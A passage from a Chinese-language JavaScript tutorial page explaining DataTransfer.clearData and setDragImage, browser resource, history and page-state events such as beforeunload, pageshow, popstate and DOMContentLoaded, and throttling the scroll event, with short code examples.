class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-3-DataTransfer-clearData-清除指定或全部数据"><a href="#5-3-DataTransfer-clearData-清除指定或全部数据" class="headerlink" title="5.3 DataTransfer.clearData() 清除指定或全部数据"></a>5.3 DataTransfer.clearData() 清除指定或全部数据</h4><p><code>DataTransfer.clearData()</code>方法接受一个字符串（表示数据类型）作为参数，删除事件所带的指定类型的数据。如果没有指定类型，则删除所有数据。如果指定类型不存在，则调用该方法不会产生任何效果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.<span class="property">dataTransfer</span>.<span class="title function_">clearData</span>(<span class="string">&#x27;text/uri-list&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码清除事件所带的<code>text/uri-list</code>类型的数据。</p>
<p>该方法不会移除拖拉的文件，因此调用该方法后，<code>DataTransfer.types</code>属性可能依然会返回<code>Files</code>类型（前提是存在文件拖拉）。</p>
<p>注意，该方法<strong>只能在<code>dragstart</code>事件的监听函数之中使用</strong>，因为这是拖拉操作的数据唯一可写的时机。</p>
<h4 id="5-4-DataTransfer-setDragImage-设置拖动过程中的图片"><a href="#5-4-DataTransfer-setDragImage-设置拖动过程中的图片" class="headerlink" title="5.4 DataTransfer.setDragImage() 设置拖动过程中的图片"></a>5.4 DataTransfer.setDragImage() 设置拖动过程中的图片</h4><p>拖动过程中（<code>dragstart</code>事件触发后），浏览器<strong>会显示一张图片跟随鼠标一起移动</strong>，表示被拖动的节点。这张图片是<strong>自动创造的</strong>，通常显示为被拖动节点的外观，不需要自己动手设置。</p>
<p><code>DataTransfer.setDragImage()</code>方法<strong>可以自定义这张图片</strong>。它接受三个参数。第一个是<code> &lt;img&gt; </code>节点或者<code>&lt;canvas&gt;</code>节点，如果省略或为<code>null</code>，则使用被拖动的节点的外观；第二个和第三个参数为鼠标相对于该图片左上角的横坐标和右坐标。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;div id=&quot;drag-with-image&quot; class=&quot;dragdemo&quot; draggable=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="comment">   drag me</span></span><br><span class="line"><span class="comment"> &lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;drag-with-image&#x27;</span>);</span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  img.<span class="property">src</span> = <span class="string">&#x27;http://path/to/img&#x27;</span>;</span><br><span class="line">  e.<span class="property">dataTransfer</span>.<span class="title function_">setDragImage</span>(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h2 id="十、其他常见事件"><a href="#十、其他常见事件" class="headerlink" title="十、其他常见事件"></a>十、其他常见事件</h2><h3 id="1、资源事件"><a href="#1、资源事件" class="headerlink" title="1、资源事件"></a>1、资源事件</h3><h4 id="1-1-beforeunload-事件-（关闭窗口前调用）"><a href="#1-1-beforeunload-事件-（关闭窗口前调用）" class="headerlink" title="1.1 beforeunload 事件 （关闭窗口前调用）"></a>1.1 beforeunload 事件 （关闭窗口前调用）</h4><p><code>beforeunload</code>事件在<strong>窗口、文档、各种资源将要卸载前触发</strong>。它可以用来防止用户不小心卸载资源。</p>
<p>如果该事件对象的<code>returnValue</code>属性是一个非空字符串，那么浏览器就会弹出一个对话框，询问用户是否要卸载该资源。但是，用户指定的字符串可能无法显示，浏览器会展示预定义的字符串。如果用户点击“取消”按钮，资源就不会卸载。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;beforeunload&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">returnValue</span> = <span class="string">&#x27;你确定离开吗？&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，用户如果<strong>关闭窗口，浏览器会弹出一个窗口，要求用户确认</strong>。</p>
<p>浏览器对这个事件的行为很不一致，有的浏览器调用<code>event.preventDefault()</code>，也会弹出对话框。IE 浏览器需要显式返回一个非空的字符串，才会弹出对话框。而且，<strong>大多数浏览器在对话框中不显示指定文本，只显示默认文本</strong>。因此，可以采用下面的写法，取得最大的兼容性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;beforeunload&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> confirmationMessage = <span class="string">&#x27;确认关闭窗口？&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  e.<span class="property">returnValue</span> = confirmationMessage;</span><br><span class="line">  <span class="keyword">return</span> confirmationMessage;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>注意，许多手机浏览器默认忽略这个事件，桌面浏览器也有办法忽略这个事件。所以，它可能根本不会生效，不能依赖它来阻止用户关闭窗口。另外，一旦使用了<code>beforeunload</code>事件，浏览器就不会缓存当前网页，使用“回退”按钮将重新向服务器请求网页。这是因为监听这个事件的目的，一般是修改初始状态，这时缓存初始页面就没意义了。</p>
<p>基本上，只有一种场合可以监听<code>unload</code>事件，其他情况都不应该监听：<strong>用户修改了表单，还没有保存就要离开</strong>。</p>
<h4 id="1-2-unload-事件-（即将关闭窗口时调用）"><a href="#1-2-unload-事件-（即将关闭窗口时调用）" class="headerlink" title="1.2 unload 事件 （即将关闭窗口时调用）"></a>1.2 unload 事件 （即将关闭窗口时调用）</h4><p><code>unload</code>事件在<strong>窗口关闭或者<code>document</code>对象将要卸载时触发</strong>。它的触发顺序排在<code>beforeunload</code>、<code>pagehide</code>事件后面。</p>
<p><code>unload</code>事件发生时，文档处于一个特殊状态。所有资源依然存在，但是对用户来说都不可见，UI 互动全部无效。这个事件是无法取消的，即使在监听函数里面抛出错误，也不能停止文档的卸载。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;文档将要卸载&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>手机上，浏览器或系统可能会直接丢弃网页，这时该事件根本不会发生。而且跟<code>beforeunload</code>事件一样，一旦使用了<code>unload</code>事件，浏览器就不会缓存当前网页，理由同上。因此，任何情况下都不应该依赖这个事件，指定网页卸载时要执行的代码，可以考虑完全不使用这个事件。</p>
<h4 id="1-3-load-事件，error-事件-，abort事件-（页面或某个资源加载成功-失败-取消时调用）"><a href="#1-3-load-事件，error-事件-，abort事件-（页面或某个资源加载成功-失败-取消时调用）" class="headerlink" title="1.3 load 事件，error 事件 ，abort事件 （页面或某个资源加载成功&#x2F;失败&#x2F;取消时调用）"></a>1.3 load 事件，error 事件 ，abort事件 （页面或某个资源加载成功&#x2F;失败&#x2F;取消时调用）</h4><p><code>load</code>事件<strong>在页面或某个资源加载成功时触发</strong>。注意，<strong>页面或资源从浏览器缓存加载，并不会触发<code>load</code>事件</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;所有资源都加载完成&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>error</code>事件是<strong>在页面或资源加载失败时触发</strong>。</p>
<p><code>abort</code>事件是<strong>在用户取消加载时触发</strong>。</p>
<p>这三个事件实际上属于进度事件，不仅发生在<code>document</code>对象，还发生在各种外部资源上面。浏览网页就是一个加载各种资源的过程，图像（image）、样式表（style sheet）、脚本（script）、视频（video）、音频（audio）、Ajax请求（XMLHttpRequest）等等。这些资源和<code>document</code>对象、<code>window</code>对象、XMLHttpRequestUpload 对象，都会触发<code>load</code>事件和<code>error</code>事件。</p>
<p><strong>触发这三个事件的对象有</strong>：</p>
<ul>
<li>window</li>
<li>document</li>
<li>body</li>
<li>img</li>
<li>style</li>
<li>script</li>
<li>video</li>
<li>audio</li>
<li>Ajax</li>
<li>等等</li>
</ul>
<h3 id="2、session-历史事件"><a href="#2、session-历史事件" class="headerlink" title="2、session 历史事件"></a>2、session 历史事件</h3><h4 id="2-1-pageshow-事件（页面显示，加载页面后执行），pagehide-事件（退出当前页面触发）"><a href="#2-1-pageshow-事件（页面显示，加载页面后执行），pagehide-事件（退出当前页面触发）" class="headerlink" title="2.1 pageshow 事件（页面显示，加载页面后执行），pagehide 事件（退出当前页面触发）"></a>2.1 pageshow 事件（页面显示，加载页面后执行），pagehide 事件（退出当前页面触发）</h4><p>默认情况下，浏览器会在当前会话（session）缓存页面，当用户<strong>点击“前进&#x2F;后退”按钮时，浏览器就会从缓存中加载页面。</strong></p>
<p>pageshow 事件<strong>在页面加载时触发，包括第一次加载和从缓存加载两种情况</strong>。如果要指定页面每次加载（不管是不是从浏览器缓存）时都运行的代码，可以放在这个事件的监听函数。</p>
<p>第一次加载时，它的触发顺序排在<code>load</code>事件后面。从缓存加载时，<code>load</code>事件不会触发，因为网页在缓存中的样子通常是<code>load</code>事件的监听函数运行后的样子，所以不必重复执行。同理，如果是从缓存中加载页面，网页内初始化的 JavaScript 脚本（比如 DOMContentLoaded 事件的监听函数）也不会执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;pageshow&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pageshow: &#x27;</span>, event);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>pageshow 事件<strong>有一个<code>persisted</code>属性</strong>，返回一个布尔值。页面第一次加载时，这个属性是<code>false</code>；当页面从缓存加载时，这个属性是<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;pageshow&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">persisted</span>) &#123; <span class="comment">// 是否从缓存加载</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>pagehide</code>事件与<code>pageshow</code>事件类似，当用户<strong>通过“前进&#x2F;后退”按钮，离开当前页面时触发</strong>。它与 unload 事件的区别在于，如果在 window 对象上定义<code>unload</code>事件的监听函数之后，页面不会保存在缓存中，而使用<code>pagehide</code>事件，页面会保存在缓存中。</p>
<p><code>pagehide</code>事件实例也<strong>有一个<code>persisted</code>属性，将这个属性设为<code>true</code>，就表示页面要保存在缓存中；设为<code>false</code>，表示网页不保存在缓存中</strong>，这时如果设置了unload 事件的监听函数，该函数将在 pagehide 事件后立即运行。</p>
<p>如果页面包含<code>&lt;frame&gt;</code>或<code> &lt;iframe&gt; </code>元素，则<code>&lt;frame&gt;</code>页面的<code>pageshow</code>事件和<code>pagehide</code>事件，都会在主页面之前触发。</p>
<p><strong>注意，这两个事件只在浏览器的<code>history</code>（历史）对象发生变化时触发，跟网页是否可见没有关系。</strong></p>
<h4 id="2-2-popstate-事件（在浏览器的history对象的当前记录发生显式切换时触发）"><a href="#2-2-popstate-事件（在浏览器的history对象的当前记录发生显式切换时触发）" class="headerlink" title="2.2 popstate 事件（在浏览器的history对象的当前记录发生显式切换时触发）"></a>2.2 popstate 事件（在浏览器的<code>history</code>对象的当前记录发生显式切换时触发）</h4><p><code>popstate</code>事件<strong>在浏览器的<code>history</code>对象的当前记录发生显式切换时触发</strong>。注意，调用<code>history.pushState()</code>或<code>history.replaceState()</code>，并不会触发<code>popstate</code>事件。该事件只在用户在<code>history</code>记录之间显式切换时触发，比如<strong>鼠标点击“后退&#x2F;前进”按钮，或者在脚本中调用<code>history.back()</code>、<code>history.forward()</code>、<code>history.go()</code>时触发</strong>。</p>
<p>该事件对象有一个<code>state</code>属性，保存<code>history.pushState</code>方法和<code>history.replaceState</code>方法为当前记录添加的<code>state</code>对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onpopstate</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;state: &#x27;</span> + event.<span class="property">state</span>);</span><br><span class="line">&#125;;</span><br><span class="line">history.<span class="title function_">pushState</span>(&#123;<span class="attr">page</span>: <span class="number">1</span>&#125;, <span class="string">&#x27;title 1&#x27;</span>, <span class="string">&#x27;?page=1&#x27;</span>);</span><br><span class="line">history.<span class="title function_">pushState</span>(&#123;<span class="attr">page</span>: <span class="number">2</span>&#125;, <span class="string">&#x27;title 2&#x27;</span>, <span class="string">&#x27;?page=2&#x27;</span>);</span><br><span class="line">history.<span class="title function_">replaceState</span>(&#123;<span class="attr">page</span>: <span class="number">3</span>&#125;, <span class="string">&#x27;title 3&#x27;</span>, <span class="string">&#x27;?page=3&#x27;</span>);</span><br><span class="line">history.<span class="title function_">back</span>(); <span class="comment">// state: &#123;&quot;page&quot;:1&#125;</span></span><br><span class="line">history.<span class="title function_">back</span>(); <span class="comment">// state: null</span></span><br><span class="line">history.<span class="title function_">go</span>(<span class="number">2</span>);  <span class="comment">// state: &#123;&quot;page&quot;:3&#125;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>pushState</code>方法向<code>history</code>添加了两条记录，然后<code>replaceState</code>方法替换掉当前记录。因此，连续两次<code>back</code>方法，会让当前条目退回到原始网址，它没有附带<code>state</code>对象，所以事件的<code>state</code>属性为<code>null</code>，然后前进两条记录，又回到<code>replaceState</code>方法添加的记录。</p>
<p>浏览器对于页面首次加载，是否触发<code>popstate</code>事件，处理不一样，Firefox 不触发该事件。</p>
<h4 id="2-3-hashchange-事件-（hash发生变化时触发）"><a href="#2-3-hashchange-事件-（hash发生变化时触发）" class="headerlink" title="2.3 hashchange 事件 （hash发生变化时触发）"></a>2.3 hashchange 事件 （hash发生变化时触发）</h4><p><code>hashchange</code>事件在 U<strong>RL 的 hash 部分（即<code>#</code>号后面的部分，包括<code>#</code>号）发生变化时触发</strong>。该事件<strong>一般在<code>window</code>对象上监听</strong>。</p>
<p><code>hashchange</code>的事件实例具有两个特有属性：<code>oldURL</code>属性和<code>newURL</code>属性，分别表示变化前后的完整 URL。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URL 是 http://www.example.com/</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, myFunction);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">oldURL</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">newURL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location.<span class="property">hash</span> = <span class="string">&#x27;part2&#x27;</span>;</span><br><span class="line"><span class="comment">// http://www.example.com/</span></span><br><span class="line"><span class="comment">// http://www.example.com/#part2</span></span><br></pre></td></tr></table></figure>



<h3 id="3、网页状态事件"><a href="#3、网页状态事件" class="headerlink" title="3、网页状态事件"></a>3、网页状态事件</h3><h4 id="3-1-DOMContentLoaded-事件-（DOM内容加载完成后触发）"><a href="#3-1-DOMContentLoaded-事件-（DOM内容加载完成后触发）" class="headerlink" title="3.1 DOMContentLoaded 事件 （DOM内容加载完成后触发）"></a>3.1 DOMContentLoaded 事件 （DOM内容加载完成后触发）</h4><p><strong>网页下载并解析完成以后，浏览器就会在<code>document</code>对象上触发 DOMContentLoaded 事件</strong>。这时，仅仅完成了网页的解析（整张页面的 DOM 生成了），<strong>所有外部资源（样式表、脚本、iframe 等等）可能还没有下载结束</strong>。也就是说，这个事件<strong>比<code>load</code>事件，发生时间早得多</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;DOM生成&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>注意，网页的 JavaScript 脚本是同步执行的，脚本一旦发生堵塞，将推迟触发<code>DOMContentLoaded</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;DOM 生成&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这段代码会推迟触发 DOMContentLoaded 事件</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-readystatechange-事件（Document-对象和-XMLHttpRequest-对象的readyState属性发生变化时触发）"><a href="#3-2-readystatechange-事件（Document-对象和-XMLHttpRequest-对象的readyState属性发生变化时触发）" class="headerlink" title="3.2 readystatechange 事件（Document 对象和 XMLHttpRequest 对象的readyState属性发生变化时触发）"></a>3.2 readystatechange 事件（Document 对象和 XMLHttpRequest 对象的<code>readyState</code>属性发生变化时触发）</h4><p><code>readystatechange</code>事件<strong>当 Document 对象和 XMLHttpRequest 对象的<code>readyState</code>属性发生变化时触发</strong>。<code>document.readyState</code>有三个可能的值：<code>loading</code>（网页正在加载）、<code>interactive</code>（网页已经解析完成，但是外部资源仍然处在加载状态）和<code>complete</code>（网页和所有外部资源已经结束加载，<code>load</code>事件即将触发）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&#x27;interactive&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个事件可以看作<code>DOMContentLoaded</code>事件的另一种实现方法。</p>
<h3 id="4、窗口事件"><a href="#4、窗口事件" class="headerlink" title="4、窗口事件"></a>4、窗口事件</h3><h4 id="4-1-scroll-事件-（文档或文档元素滚动时触发）"><a href="#4-1-scroll-事件-（文档或文档元素滚动时触发）" class="headerlink" title="4.1 scroll 事件 （文档或文档元素滚动时触发）"></a>4.1 scroll 事件 （文档或文档元素滚动时触发）</h4><p><code>scroll</code>事件在<strong>文档或文档元素滚动时触发</strong>，主要出现在用户拖动滚动条。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, callback);</span><br></pre></td></tr></table></figure>

<p>该事件<strong>会连续地大量触发</strong>，所以它的监听函数之中不应该有非常耗费计算的操作。推荐的做法是使用<code>requestAnimationFrame</code>或<code>setTimeout</code>控制该事件的触发频率，然后可以结合<code>customEvent</code>抛出一个新事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> throttle = <span class="keyword">function</span> (<span class="params">type, name, obj</span>) &#123; <span class="comment">// 节流函数 控制触发频率</span></span><br><span class="line">    <span class="keyword">var</span> obj = obj || <span class="variable language_">window</span>;</span><br><span class="line">    <span class="keyword">var</span> running = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (running) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">      running = <span class="literal">true</span>;</span><br><span class="line">      <span class="title function_">requestAnimationFrame</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="comment">// 结合此方法控制在每秒60次</span></span><br><span class="line">        obj.<span class="title function_">dispatchEvent</span>(<span class="keyword">new</span> <span class="title class_">CustomEvent</span>(name));</span><br><span class="line">        running = <span class="literal">false</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    obj.<span class="title function_">addEventListener</span>(type, func);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 scroll 事件重定义为 optimizedScroll 事件</span></span><br><span class="line">  <span class="title function_">throttle</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="string">&#x27;optimizedScroll&#x27;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;optimizedScroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Resource conscious scroll callback!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>throttle</code>函数用于控制事件触发频率，<code>requestAnimationFrame</code>方法保证每次页面重绘（每秒60次），只会触发一次<code>scroll</code>事件的监听函数。也就是说，上面方法将<code>scroll</code>事件的触发频率，限制在每秒60次。具体来说，就是<code>scroll</code>事件只要频率低于每秒60次，就会触发<code>optimizedScroll</code>事件，从而执行<code>optimizedScroll</code>事件的监听函数。</p>
<p>改用<code>setTimeout</code>方法，可以放置更大的时间间隔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, scrollThrottler, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> scrollTimeout;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">scrollThrottler</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!scrollTimeout) &#123;</span><br><span class="line">      scrollTimeout = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        scrollTimeout = <span class="literal">null</span>;</span><br><span class="line">        <span class="title function_">actualScrollHandler</span>();</span><br><span class="line">      &#125;, <span class="number">66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">actualScrollHandler</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>

<p>上面代码中，每次<code>scroll</code>事件都会执行<code>scrollThrottler</code>函数。该函数里面有一个定时器<code>setTimeout</code>，每66毫秒触发一次（每秒15次）真正执行的任务<code>actualScrollHandler</code>。</p>
<p>下面是一个更一般的<code>throttle</code>函数的写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, wait</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((time + wait - <span class="title class_">Date</span>.<span class="title function_">now</span>()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_">fn</span>();</span><br><span class="line">      time = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="title function_">throttle</span>(callback, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>

<p>上面的代码将<code>scroll</code>事件的触发频率，限制在一秒一次。</p>
<p><a target="_blank" rel="noopener" href="https://www.lodashjs.com/">lodash</a>函数库提供了现成的<code>throttle</code>函数，可以直接使用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, _.<span class="title function_">throttle</span>(callback, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>

<p>本书前面介绍过<code>debounce</code>的概念，<code>throttle</code>与它区别在于，<code>throttle</code>是“节流”，确保一段时间内只执行一次，而<code>debounce</code>是“防抖”，要连续操作结束后再执行。以网页滚动为例，<code>debounce</code>要等到用户停止滚动后才执行，<code>throttle</code>则是如果用户一直在滚动网页，那么在滚动过程中还是会执行。</p>
